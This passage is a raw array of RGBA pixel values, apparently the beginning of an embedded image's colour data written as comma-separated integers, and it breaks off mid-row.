255, 255, 255, 255, 255, 252, 252, 252, 255, 243, 243, 243, 255, 69, 69, 69, 255, 10, 10, 10, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 10, 10, 10, 255, 37, 37, 37, 255, 85, 85, 85, 255, 118, 118, 118, 255, 105, 105, 105, 255, 82, 82, 82, 255, 55, 55, 55, 255, 26, 26, 26, 255, 8, 8, 8, 255, 26, 26, 26, 255, 4, 4, 4, 255, 9, 9, 9, 255, 167, 167, 167, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 247, 247, 247, 255, 158, 158, 158, 255, 0, 0, 0, 255, 12, 12, 12, 255, 8, 8, 8, 255, 2, 2, 2, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 2, 2, 2, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 3, 3, 3, 255, 4, 4, 4, 255, 14, 14, 14, 255, 44, 44, 44, 255, 93, 93, 93, 255, 125, 125, 125, 255, 111, 111, 111, 255, 84, 84, 84, 255, 64, 64, 64, 255, 35, 35, 35, 255, 26, 26, 26, 255, 0, 0, 0, 255, 9, 9, 9, 255, 0, 0, 0, 255, 29, 29, 29, 255, 218, 218, 218, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 241, 241, 241, 255, 45, 45, 45, 255, 5, 5, 5, 255, 1, 1, 1, 255, 0, 0, 0, 255, 6, 6, 6, 255, 3, 3, 3, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 3, 3, 3, 255, 4, 4, 4, 255, 20, 20, 20, 255, 50, 50, 50, 255, 87, 87, 87, 255, 107, 107, 107, 255, 93, 93, 93, 255, 66, 66, 66, 255, 52, 52, 52, 255, 38, 38, 38, 255, 38, 38, 38, 255, 5, 5, 5, 255, 0, 0, 0, 255, 8, 8, 8, 255, 3, 3, 3, 255, 91, 91, 91, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 181, 181, 181, 255, 1, 1, 1, 255, 12, 12, 12, 255, 2, 2, 2, 255, 1, 1, 1, 255, 6, 6, 6, 255, 3, 3, 3, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 21, 21, 21, 255, 47, 47, 47, 255, 66, 66, 66, 255, 73, 73, 73, 255, 61, 61, 61, 255, 41, 41, 41, 255, 27, 27, 27, 255, 27, 27, 27, 255, 20, 20, 20, 255, 19, 19, 19, 255, 0, 0, 0, 255, 1, 1, 1, 255, 21, 21, 21, 255, 6, 6, 6, 255, 175, 175, 175, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 85, 85, 85, 255, 2, 2, 2, 255, 6, 6, 6, 255, 4, 4, 4, 255, 10, 10, 10, 255, 2, 2, 2, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 2, 2, 2, 255, 1, 1, 1, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 2, 2, 2, 255, 0, 0, 0, 255, 1, 1, 1, 255, 20, 20, 20, 255, 37, 37, 37, 255, 37, 37, 37, 255, 33, 33, 33, 255, 22, 22, 22, 255, 13, 13, 13, 255, 8, 8, 8, 255, 10, 10, 10, 255, 1, 1, 1, 255, 3, 3, 3, 255, 2, 2, 2, 255, 11, 11, 11, 255, 0, 0, 0, 255, 12, 12, 12, 255, 75, 75, 75, 255, 231, 231, 231, 255, 254, 254, 254, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 245, 245, 245, 255, 29, 29, 29, 255, 7, 7, 7, 255, 2, 2, 2, 255, 0, 0, 0, 255, 2, 2, 2, 255, 0, 0, 0, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 2, 2, 2, 255, 6, 6, 6, 255, 4, 4, 4, 255, 13, 13, 13, 255, 20, 20, 20, 255, 13, 13, 13, 255, 7, 7, 7, 255, 0, 0, 0, 255, 0, 0, 0, 255, 9, 9, 9, 255, 0, 0, 0, 255, 0, 0, 0, 255, 8, 8, 8, 255, 0, 0, 0, 255, 0, 0, 0, 255, 5, 5, 5, 255, 2, 2, 2, 255, 14, 14, 14, 255, 173, 173, 173, 255, 249, 249, 249, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 219, 219, 219, 255, 13, 13, 13, 255, 0, 0, 0, 255, 0, 0, 0, 255, 5, 5, 5, 255, 4, 4, 4, 255, 2, 2, 2, 255, 2, 2, 2, 255, 2, 2, 2, 255, 1, 1, 1, 255, 1, 0, 0, 255, 1, 1, 1, 255, 2, 0, 1, 255, 2, 2, 2, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 9, 9, 9, 255, 3, 3, 3, 255, 2, 2, 2, 255, 3, 3, 3, 255, 1, 1, 1, 255, 3, 3, 3, 255, 1, 1, 1, 255, 10, 10, 10, 255, 0, 0, 0, 255, 7, 7, 7, 255, 5, 5, 5, 255, 0, 0, 0, 255, 10, 10, 10, 255, 3, 3, 3, 255, 0, 0, 0, 255, 0, 0, 0, 255, 4, 4, 4, 255, 101, 101, 101, 255, 244, 244, 244, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 254, 254, 254, 255, 170, 170, 172, 255, 3, 3, 5, 255, 2, 2, 2, 255, 0, 0, 0, 255, 3, 1, 2, 255, 3, 1, 2, 255, 4, 2, 3, 255, 3, 1, 2, 255, 4, 3, 1, 255, 11, 10, 8, 255, 4, 0, 0, 255, 2, 1, 0, 255, 4, 0, 1, 255, 5, 3, 4, 255, 8, 8, 8, 255, 2, 2, 2, 255, 0, 0, 2, 255, 6, 6, 8, 255, 2, 2, 4, 255, 1, 1, 3, 255, 9, 9, 11, 255, 1, 1, 3, 255, 7, 8, 10, 255, 2, 3, 5, 255, 0, 0, 2, 255, 8, 9, 11, 255, 10, 11, 13, 255, 11, 12, 14, 255, 3, 5, 4, 255, 0, 1, 0, 255, 1, 1, 1, 255, 3, 3, 3, 255, 4, 4, 4, 255, 0, 0, 0, 255, 3, 3, 3, 255, 3, 3, 3, 255, 0, 0, 0, 255, 4, 4, 4, 255, 4, 4, 4, 255, 7, 7, 7, 255, 5, 5, 5, 255, 227, 227, 227, 255,
    255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 137, 137, 139, 255, 0, 0, 2, 255, 6, 6, 6, 255, 1, 1, 1, 255, 5, 3, 4, 255, 5, 3, 4, 255, 1, 0, 0, 255, 2, 0, 1, 255, 6, 2, 1, 255, 8, 4, 3, 255, 4, 0, 0, 255, 4, 0, 0, 255, 4, 0, 1, 255, 1, 0, 0, 255, 5, 3, 4, 255, 0, 0, 0, 255, 1, 1, 3, 255, 4, 4, 6, 255, 0, 0, 2, 255, 0, 0, 2, 255, 9, 9, 11, 255, 3, 3, 5, 255, 0, 0, 2, 255, 2, 3, 5, 255, 1, 1, 3, 255, 0, 2, 1, 255, 0, 0, 2, 255, 2, 4, 3, 255, 4, 6, 5, 255, 5, 7, 6, 255, 6, 6, 6, 255, 3, 3, 3, 255, 1, 1, 1, 255, 0, 0, 0, 255, 1, 1, 1, 255, 4, 4, 4, 255, 1, 1, 1, 255, 1, 1, 1, 255, 1, 1, 1, 255, 3, 3, 3, 255, 7, 7, 7, 255, 179, 179, 179, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 99, 99, 99, 255, 0, 0, 0, 255, 5, 5, 5, 255, 1, 1, 1, 255, 5, 5, 5, 255, 1, 1, 1, 255, 1, 1, 0, 255, 7, 7, 5, 255, 9, 8, 6, 255, 1, 0, 0, 255, 3, 2, 0, 255, 6, 5, 3, 255, 6, 5, 3, 255, 2, 1, 0, 255, 3, 1, 2, 255, 1, 0, 0, 255, 2, 0, 1, 255, 3, 1, 2, 255, 1, 0, 0, 255, 1, 0, 0, 255, 5, 3, 4, 255, 1, 0, 0, 255, 11, 9, 10, 255, 0, 0, 0, 255, 19, 17, 18, 255, 10, 10, 8, 255, 17, 19, 18, 255, 2, 4, 3, 255, 16, 18, 17, 255, 8, 10, 9, 255, 1, 1, 1, 255, 0, 0, 0, 255, 2, 2, 2, 255, 1, 1, 1, 255, 0, 0, 0, 255, 3, 3, 3, 255, 3, 3, 3, 255, 1, 1, 1, 255, 2, 2, 2, 255, 2, 2, 2, 255, 11, 11, 11, 255, 116, 116, 116, 255, 254, 254, 254, 255, 255, 255, 255, 255, 255, 255, 255, 255, 248, 248, 248, 255, 65, 65, 65, 255, 4, 4, 4, 255, 5, 5, 5, 255, 1, 1, 1, 255, 4, 4, 4, 255, 9, 9, 9, 255, 12, 12, 10, 255, 3, 3, 1, 255, 7, 6, 4, 255, 22, 21, 19, 255, 31, 30, 28, 255, 12, 11, 9, 255, 1, 0, 0, 255, 4, 3, 1, 255, 5, 3, 4, 255, 3, 1, 2, 255, 5, 1, 2, 255, 5, 1, 2, 255, 3, 1, 2, 255, 5, 3, 4, 255, 4, 2, 3, 255, 1, 0, 0, 255, 1, 0, 0, 255, 1, 0, 0, 255, 3, 2, 0, 255, 3, 3, 1, 255, 0, 2, 0, 255, 17, 19, 16, 255, 35, 37, 36, 255, 39, 41, 40, 255, 25, 25, 25, 255, 6, 6, 6, 255, 0, 0, 0, 255, 2, 2, 2, 255, 3, 3, 3, 255, 2, 2, 2, 255, 0, 0, 0, 255, 1, 1, 1, 255, 5, 5, 5, 255, 2, 2, 2, 255, 13, 13, 13, 255, 65, 65, 65, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 255, 253, 255, 245, 245, 243, 255, 47, 47, 45, 255, 2, 2, 0, 255, 2, 1, 0, 255, 13, 12, 10, 255, 5, 5, 3, 255, 4, 4, 2, 255, 7, 7, 5, 255, 16, 16, 14, 255, 28, 28, 28, 255, 37, 37, 37, 255, 38, 38, 38, 255, 23, 23, 23, 255, 6, 6, 6, 255, 0, 0, 0, 255, 7, 5, 8, 255, 3, 1, 4, 255, 6, 2, 3, 255, 4, 0, 1, 255, 6, 2, 1, 255, 8, 4, 3, 255, 2, 0, 1, 255, 7, 5, 6, 255, 22, 21, 19, 255, 4, 3, 1, 255, 0, 0, 0, 255, 12, 12, 10, 255, 9, 11, 6, 255, 3, 5, 0, 255, 22, 24, 21, 255, 49, 51, 48, 255, 67, 67, 67, 255, 25, 25, 25, 255, 0, 0, 0, 255, 0, 0, 0, 255, 5, 5, 5, 255, 3, 3, 3, 255, 0, 0, 0, 255, 0, 0, 0, 255, 4, 4, 4, 255, 0, 0, 0, 255, 7, 7, 7, 255, 35, 35, 35, 255, 248, 248, 248, 255, 255, 255, 255, 255, 252, 252, 250, 255, 241, 241, 239, 255, 39, 39, 37, 255, 3, 3, 1, 255, 3, 2, 0, 255, 15, 14, 12, 255, 1, 1, 0, 255, 4, 4, 2, 255, 18, 18, 16, 255, 11, 11, 9, 255, 0, 0, 0, 255, 8, 8, 8, 255, 25, 27, 26, 255, 44, 46, 45, 255, 25, 25, 25, 255, 2, 2, 2, 255, 4, 4, 6, 255, 2, 0, 3, 255, 7, 5, 6, 255, 6, 2, 3, 255, 5, 1, 2, 255, 1, 0, 0, 255, 1, 0, 0, 255, 16, 14, 15, 255, 17, 16, 14, 255, 78, 77, 75, 255, 101, 101, 99, 255, 121, 121, 119, 255, 116, 118, 115, 255, 68, 70, 65, 255, 5, 7, 4, 255, 10, 12, 9, 255, 48, 48, 48, 255, 34, 34, 34, 255, 18, 18, 18, 255, 3, 3, 3, 255, 0, 0, 0, 255, 4, 4, 4, 255, 3, 3, 3, 255, 1, 1, 1, 255, 2, 2, 2, 255, 0, 0, 0, 255, 2, 2, 2, 255, 19, 19, 19, 255, 234, 234, 234, 255, 254, 254, 254, 255, 255, 255, 251, 255, 239, 240, 235, 255, 33, 33, 31, 255, 8, 8, 6, 255, 9, 9, 7, 255, 2, 2, 0, 255, 6, 6, 6, 255, 61, 61, 61, 255, 90, 92, 91, 255, 151, 153, 152, 255, 136, 136, 138, 255, 66, 66, 68, 255, 4, 6, 5, 255, 39, 41, 40, 255, 33, 33, 33, 255, 1, 1, 1, 255, 2, 2, 2, 255, 0, 0, 0, 255, 9, 9, 11, 255, 5, 3, 4, 255, 2, 0, 1, 255, 5, 3, 4, 255, 21, 19, 20, 255, 63, 63, 63, 255, 114, 114, 112, 255, 130, 130, 128, 255, 147, 147, 147, 255, 182, 182, 180, 255, 145, 145, 143, 255, 206, 206, 204, 255, 142, 142, 142, 255, 14, 14, 14, 255, 10, 10, 10, 255, 25, 25, 25, 255, 25, 25, 25, 255, 6, 6, 6, 255, 0, 0, 0, 255, 4, 4, 4, 255, 4, 4, 4, 255, 0, 0, 0, 255, 0, 0, 0, 255, 3, 3, 3, 255, 1, 1, 1, 255, 8, 8, 8, 255, 216, 216, 216, 255, 255, 255, 255, 255, 254, 255, 250, 255, 252, 252, 250, 255, 42, 42, 40, 255, 0, 0, 0, 255, 2, 2, 0, 255, 6, 6, 4, 255, 42, 42, 42, 255, 128, 128, 128, 255, 179, 179, 179, 255, 202, 202, 202, 255, 194, 194, 196, 255, 167, 167, 169, 255, 65, 67, 66, 255, 19, 21, 20, 255, 1, 1, 1, 255, 20, 20, 20, 255, 2, 4, 3, 255, 1, 3, 2, 255, 8, 8, 10, 255, 1, 1, 3, 255, 0, 0, 0, 255, 16, 16, 16, 255, 58, 58, 58, 255, 128, 128, 128, 255, 148, 148, 148, 255, 154, 154, 154, 255, 196, 196, 196, 255, 166, 166, 166, 255, 197, 197, 197, 255, 187, 187, 187, 255, 192, 192, 192, 255, 126, 126, 126, 255, 19, 19, 19, 255, 16, 16, 16, 255, 10, 10, 10, 255, 2, 2, 2, 255, 3, 3, 3, 255, 4, 4, 4, 255, 0, 0, 0, 255, 1, 1, 1, 255, 0, 0, 0, 255, 6, 6, 6, 255, 3, 3, 3, 255, 1, 1, 1, 255, 203, 203, 203, 255, 255, 255, 255, 255, 254, 254, 252, 255, 243, 243, 241, 255, 41, 41, 41, 255, 9, 9, 9, 255, 0, 0, 0, 255, 1, 1, 1, 255, 96, 96, 98, 255, 126, 126, 128, 255, 177, 177, 179, 255, 195, 195, 197, 255, 194, 194, 196, 255, 191, 191, 193, 255, 156, 157, 159, 255, 72, 73, 75, 255, 15, 17, 16, 255, 0, 2, 1, 255, 3, 5, 4, 255, 6, 8, 7, 255, 3, 5, 4, 255, 0, 1, 0, 255, 4, 5, 7, 255, 45, 45, 47, 255, 137, 137, 139, 255, 193, 193, 195, 255, 199, 199, 201, 255, 228, 228, 230, 255, 189, 187, 190, 255, 241, 239, 242, 255, 222, 220, 223, 255, 219, 217, 220, 255, 197, 197, 199, 255, 143, 143, 145, 255, 87, 87, 87, 255, 5, 5, 5, 255, 0, 0, 0, 255, 5, 5, 5, 255, 2, 2, 2, 255, 3, 3, 3, 255, 5, 5, 5, 255, 3, 3, 3, 255, 2, 2, 2, 255, 0, 0, 0, 255, 5, 5, 5, 255, 0, 0, 0, 255, 173, 173, 173, 255, 255, 255, 255, 255, 254, 254, 252, 255, 246, 246, 246, 255, 45, 45, 47, 255, 6, 6, 8, 255, 0, 0, 0, 255, 23, 23, 23, 255, 152, 152, 154, 255, 205, 205, 207, 255, 236, 234, 237, 255, 255, 253, 255, 255, 241, 241, 243, 255, 243, 243, 243, 255, 243, 243, 243, 255, 176, 178, 177, 255, 31, 33, 32, 255, 1, 3, 0, 255, 13, 15, 14, 255, 0, 2, 1, 255, 3, 5, 4, 255, 13, 15, 14, 255, 18, 20, 19, 255, 110, 111, 113, 255, 199, 199, 201, 255, 234, 234, 236, 255, 237, 237, 239, 255, 251, 251, 253, 255, 249, 247, 252, 255, 247, 245, 250, 255, 255, 253, 255, 255, 251, 249, 252, 255, 250, 250, 252, 255, 193, 193, 195, 255, 116, 116, 116, 255, 10, 10, 10, 255, 5, 5, 5, 255, 12, 12, 12, 255, 6, 6, 6, 255, 0, 0, 0, 255, 0, 0, 0, 255, 7, 7, 7, 255, 1, 1, 1, 255, 0, 0, 0, 255, 2, 2, 2, 255, 2, 2, 2, 255, 152, 152, 152, 255, 253, 253, 253, 255, 255, 255, 255, 255, 250, 250, 250, 255, 56, 56, 58, 255, 4, 4, 6, 255, 0, 1, 3, 255, 59, 60, 62, 255, 209, 209, 211, 255, 246, 246, 248, 255, 202, 200, 201, 255, 156, 154, 155, 255, 194, 192, 193, 255, 255, 255, 253, 255, 241, 241, 239, 255, 255, 255, 251, 255, 68, 69, 64, 255, 1, 2, 0, 255, 6, 6, 4, 255, 6, 6, 4, 255, 4, 4, 2, 255, 0, 0, 0, 255, 29, 29, 27, 255, 177, 177, 177, 255, 235, 235, 237, 255, 250, 250, 252, 255, 255, 255, 255, 255, 201, 201, 203, 255, 77, 75, 80, 255, 28, 26, 31, 255, 76, 75, 80, 255, 215, 214, 219, 255, 239, 237, 242, 255, 254, 252, 255, 255, 227, 227, 227, 255, 72, 72, 72, 255, 4, 4, 4, 255, 0, 0, 0, 255, 5, 5, 5, 255, 6, 6, 6, 255, 1, 1, 1, 255, 6, 6, 6, 255, 0, 0, 0, 255, 1, 1, 1, 255, 0, 0, 0, 255, 4, 4, 4, 255, 128, 128, 128, 255, 252, 252, 252, 255, 255, 255, 255, 255, 253, 253, 253, 255, 78, 78, 80, 255, 7, 7, 9, 255, 2, 3, 5, 255, 101, 101, 103, 255, 240, 240, 242, 255, 197, 195, 196, 255, 49, 47, 48, 255, 38, 37, 35, 255, 67, 66, 64, 255, 133, 132, 128, 255, 255, 254, 249, 255, 251, 250, 245, 255, 148, 145, 138, 255, 17, 14, 7, 255, 2, 1, 0, 255, 1, 0, 0, 255, 18, 15, 10, 255, 6, 2, 0, 255, 23, 22, 18, 255, 195, 194, 190, 255, 253, 252, 250, 255, 255, 254, 255, 255, 212, 210, 211, 255, 40, 38, 39, 255, 2, 0, 3, 255, 69, 67, 70, 255, 119, 119, 121, 255, 59, 58, 63, 255, 205, 203, 208, 255, 238, 236, 239, 255, 255, 255, 255, 255, 132, 132, 132, 255, 12, 12, 12, 255, 0, 0, 0, 255, 0, 0, 0, 255, 1, 1, 1, 255, 0, 0, 0, 255, 9, 9, 9, 255, 0, 0, 0, 255, 1, 1, 1, 255, 0, 0, 0, 255, 4, 4, 4, 255, 119, 119, 119, 255, 252, 252, 252, 255, 254, 254, 255, 255, 253, 253, 255, 255, 99, 99, 101, 255, 6, 6, 8, 255, 1, 1, 1, 255, 133, 133, 133, 255, 251, 249, 250, 255, 106, 102, 103, 255, 5, 1, 0, 255, 64, 60, 57, 255, 102, 99, 94, 255, 64, 61, 54, 255, 210, 207, 198, 255, 253, 250, 241, 255, 199, 195, 184, 255, 11, 7, 0, 255, 24, 17, 7, 255, 25, 18, 8, 255, 31, 22, 13, 255, 16, 9, 1, 255, 51, 47, 38, 255, 193, 188, 182, 255, 238, 235, 230, 255, 249, 245, 242, 255, 110, 106, 103, 255, 9, 8, 6, 255, 1, 0, 0, 255, 16, 14, 15, 255, 107, 107, 107, 255, 104, 104, 106, 255, 72, 72, 74, 255, 249, 249, 251, 255, 244, 244, 244, 255, 188, 188, 188, 255, 20, 20, 20, 255, 4, 4, 4, 255, 0, 0, 0, 255, 1, 1, 1, 255, 1, 1, 1, 255, 8, 8, 8, 255, 0, 0, 0, 255, 0, 0, 0, 255, 4, 4, 4, 255, 2, 2, 2, 255, 122, 122, 122, 255, 254, 254, 254, 255, 255, 255, 255, 255, 249, 249, 251, 255, 110, 110, 112, 255, 0, 0, 0, 255, 0, 0, 0, 255, 147, 145, 146, 255, 247, 243, 242, 255, 30, 26, 25, 255, 20, 16, 13, 255, 8, 3, 0, 255, 104, 99, 93, 255, 73, 69, 58, 255, 104, 98, 86, 255, 253, 247, 233, 255, 199, 192, 176, 255, 31, 24, 8, 255, 32, 23, 8, 255, 57, 48, 31, 255, 79, 67, 53, 255, 55, 46, 31, 255, 68, 58, 46, 255, 188, 180, 167, 255, 255, 250, 238, 255, 254, 247, 239, 255, 17, 12, 8, 255, 7, 3, 0, 255, 11, 7, 4, 255, 2, 1, 0, 255, 48, 47, 45, 255, 104, 104, 104, 255, 27, 27, 27, 255, 219, 219, 219, 255, 255, 255, 255, 255, 238, 238, 238, 255, 25, 25, 25, 255, 1, 1, 1, 255, 1, 1, 1, 255, 7, 7, 7, 255, 7, 7, 7, 255, 5, 5, 5, 255, 1, 1, 1, 255, 0, 0, 0, 255, 7, 7, 7, 255, 0, 0, 0, 255, 123, 123, 123, 255, 255, 255, 255, 255, 255, 255, 255, 255, 250, 250, 250, 255, 121, 121, 121, 255, 1, 1, 1, 255, 2, 0, 1, 255, 139, 138, 136, 255, 240, 236, 233, 255, 21, 18, 13, 255, 15, 10, 6, 255, 14, 7, 1, 255, 67, 60, 50, 255, 48, 42, 28, 255, 60, 53, 34, 255, 255, 253, 231, 255, 184, 176, 155, 255, 24, 13, 0, 255, 31, 19, 0, 255, 21, 6, 0, 255, 33, 18, 0, 255, 38, 26, 4, 255, 28, 15, 0, 255, 153, 142, 122, 255, 255, 248, 229, 255, 203, 196, 180, 255, 26, 19, 11, 255, 13, 8, 4, 255, 5, 0, 0, 255, 11, 6, 3, 255, 14, 13, 11, 255, 22, 21, 19, 255, 20, 19, 17, 255, 194, 193, 191, 255, 240, 240, 238, 255, 238, 238, 236, 255, 31, 31, 29, 255, 6, 6, 4, 255, 4, 4, 4, 255, 1, 1, 1, 255, 3, 3, 5, 255, 5, 5, 7, 255, 2, 2, 4, 255, 0, 0, 2, 255, 8, 8, 8, 255, 0, 0, 0, 255, 114, 114, 112, 255, 254, 254, 252, 255, 252, 252, 252, 255, 254, 254, 254, 255, 134, 134, 134, 255, 7, 7, 7, 255, 2, 1, 0, 255, 122, 121, 117, 255, 242, 239, 234, 255, 59, 54, 48, 255, 12, 5, 0, 255, 15, 6, 0, 255, 26, 16, 4, 255, 72, 61, 43, 255, 44, 35, 6, 255, 248, 238, 203, 255, 94, 80, 43, 255, 47, 32, 0, 255, 50, 32, 0, 255, 72, 55, 12, 255, 50, 33, 0, 255, 50, 32, 0, 255, 37, 22, 0, 255, 97, 83, 46, 255, 210, 197, 162, 255, 254, 243, 215, 255, 16, 7, 0, 255, 12, 3, 0, 255, 25, 16, 9, 255, 14, 7, 1, 255, 6, 1, 0, 255, 7, 3, 0, 255, 10, 7, 2, 255, 208, 207, 203, 255, 251, 250, 246, 255, 227, 227, 225, 255, 28, 28, 26, 255, 2, 2, 2, 255, 10, 10, 10, 255, 2, 2, 2, 255, 1, 1, 3, 255, 0, 0, 2, 255, 3, 3, 5, 255, 1, 1, 3, 255, 8, 8, 8, 255, 0, 0, 0, 255, 103, 103, 101, 255, 252, 252, 250, 255, 255, 253, 255, 255, 255, 253, 255, 255, 158, 158, 158, 255, 2, 2, 0, 255, 1, 2, 0, 255, 86, 85, 80, 255, 246, 242, 233, 255, 114, 107, 97, 255, 15, 5, 0, 255, 16, 3, 0, 255, 24, 8, 0, 255, 30, 14, 0, 255, 53, 35, 0, 255, 191, 174, 120, 255, 143, 123, 60, 255, 168, 148, 79, 255, 204, 182, 109, 255, 187, 165, 90, 255, 194, 172, 97, 255, 185, 165, 92, 255, 169, 151, 79, 255, 135, 117, 51, 255, 186, 170, 111, 255, 240, 226, 179, 255, 37, 23, 0, 255, 22, 9, 0, 255, 23, 11, 0, 255, 12, 2, 0, 255, 9, 2, 0, 255, 8, 4, 0, 255, 55, 51, 40, 255, 242, 239, 230, 255, 246, 245, 240, 255, 217, 216, 212, 255, 22, 22, 22, 255, 6, 6, 8, 255, 1, 2, 4, 255, 1, 2, 4, 255, 10, 10, 12, 255, 2, 2, 4, 255, 4, 2, 5, 255, 3, 1, 4, 255, 1, 1, 3, 255, 4, 4, 4, 255, 86, 88, 85, 255, 253, 255, 250, 255, 253, 251, 254, 255, 254, 252, 255, 255, 191, 191, 191, 255, 1, 1, 0, 255, 11, 12, 7, 255, 66, 66, 58, 255, 229, 223, 211, 255, 201, 194, 178, 255, 50, 38, 22, 255, 26, 11, 0, 255, 49, 29, 4, 255, 47, 25, 0, 255, 122, 98, 38, 255, 155, 132, 56, 255, 196, 170, 83, 255, 203, 177, 80, 255, 215, 188, 85, 255, 197, 170, 65, 255, 214, 187, 84, 255, 178, 155, 53, 255, 150, 128, 29, 255, 173, 154, 60, 255, 191, 173, 87, 255, 211, 194, 122, 255, 131, 115, 63, 255, 33, 18, 0, 255, 33, 18, 0, 255, 36, 21, 0, 255, 21, 10, 0, 255, 21, 14, 0, 255, 127, 122, 100, 255, 229, 226, 207, 255, 255, 252, 240, 255, 167, 164, 157, 255, 26, 25, 23, 255, 2, 2, 2, 255, 5, 6, 8, 255, 9, 11, 10, 255, 2, 2, 4, 255, 1, 1, 3, 255, 4, 2, 5, 255, 4, 2, 5, 255, 3, 3, 5, 255, 1, 1, 1, 255, 68, 70, 67, 255, 250, 252, 247, 255, 255, 255, 255, 255, 246, 246, 246, 255, 181, 181, 183, 255, 9, 9, 9, 255, 3, 2, 0, 255, 36, 33, 24, 255, 204, 197, 181, 255, 255,
    248, 223, 255, 174, 161, 129, 255, 49, 31, 0, 255, 63, 41, 0, 255, 153, 125, 60, 255, 176, 145, 62, 255, 193, 161, 60, 255, 197, 164, 51, 255, 228, 194, 71, 255, 208, 175, 46, 255, 230, 197, 68, 255, 212, 181, 54, 255, 195, 166, 40, 255, 176, 152, 28, 255, 200, 180, 59, 255, 204, 184, 71, 255, 189, 171, 69, 255, 191, 174, 86, 255, 144, 128, 53, 255, 84, 68, 8, 255, 46, 30, 0, 255, 47, 34, 0, 255, 114, 105, 62, 255, 255, 251, 214, 255, 255, 251, 219, 255, 230, 224, 202, 255, 96, 92, 80, 255, 13, 10, 5, 255, 2, 1, 0, 255, 4, 4, 4, 255, 1, 3, 0, 255, 8, 8, 8, 255, 11, 11, 11, 255, 5, 3, 4, 255, 3, 1, 2, 255, 3, 3, 3, 255, 2, 2, 2, 255, 48, 50, 49, 255, 250, 255, 251, 255, 253, 253, 253, 255, 245, 245, 245, 255, 205, 205, 205, 255, 18, 16, 17, 255, 6, 2, 0, 255, 8, 1, 0, 255, 136, 128, 107, 255, 255, 245, 211, 255, 248, 231, 185, 255, 150, 128, 68, 255, 129, 103, 28, 255, 211, 181, 91, 255, 188, 154, 46, 255, 200, 164, 42, 255, 222, 184, 51, 255, 227, 190, 49, 255, 231, 193, 46, 255, 205, 169, 19, 255, 210, 175, 29, 255, 248, 216, 71, 255, 219, 193, 48, 255, 217, 194, 52, 255, 226, 207, 69, 255, 228, 209, 80, 255, 229, 210, 90, 255, 223, 204, 99, 255, 219, 200, 108, 255, 166, 149, 69, 255, 172, 156, 81, 255, 226, 213, 145, 255, 238, 226, 168, 255, 255, 244, 198, 255, 226, 215, 183, 255, 22, 14, 0, 255, 10, 3, 0, 255, 23, 19, 16, 255, 1, 1, 0, 255, 5, 7, 4, 255, 1, 1, 0, 255, 6, 6, 6, 255, 6, 4, 5, 255, 2, 0, 1, 255, 0, 0, 0, 255, 2, 4, 3, 255, 29, 31, 30, 255, 251, 255, 254, 255, 251, 251, 249, 255, 254, 254, 252, 255, 221, 219, 220, 255, 18, 14, 13, 255, 6, 0, 0, 255, 19, 9, 0, 255, 34, 19, 0, 255, 208, 191, 148, 255, 205, 184, 121, 255, 182, 156, 